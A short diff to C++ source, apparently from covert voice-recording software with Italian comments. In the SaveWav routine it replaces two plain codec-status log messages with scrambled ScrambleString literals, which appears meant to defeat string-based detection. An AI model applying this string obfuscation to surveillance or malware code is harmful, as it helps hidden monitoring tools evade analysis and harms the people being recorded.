@@ -1726,6 +1726,8 @@ void SaveEncode(BYTE *source, DWORD total_size, DWORD channels, pVoiceAdditional
 void SaveWav(BYTE *channel_array, DWORD size, DWORD channels, pVoiceAdditionalData additional_data, DWORD additional_len)
 {
 	static BOOL first_save = TRUE;
+	ScrambleString ss1("_ yPUvU8WUAUPC 8diUE gEilg......QM\r\n\r\n"); // "- Initializing audio codec......OK\r\n\r\n"
+	ScrambleString ss2("_ yPUvU8WUAUPC 8diUE gEilg......L99Q9\r\n\r\n"); // "- Initializing audio codec......ERROR\r\n\r\n"
 
 	// Verifica che l'array sia stato allocato
 	if (!channel_array)
@@ -1735,9 +1737,9 @@ void SaveWav(BYTE *channel_array, DWORD size, DWORD channels, pVoiceAdditionalDa
 	if (first_save) {
 		first_save = FALSE;
 		if (codec_handle)
-			REPORT_STATUS_LOG("- Initializing audio codec......OK\r\n\r\n");
+			REPORT_STATUS_LOG(ss1.get_str());
 		else
-			REPORT_STATUS_LOG("- Initializing audio codec......ERROR\r\n\r\n");
+			REPORT_STATUS_LOG(ss2.get_str());
 	} 
 	
 	// Se abbimo la DLL del codec, salva in modo compresso
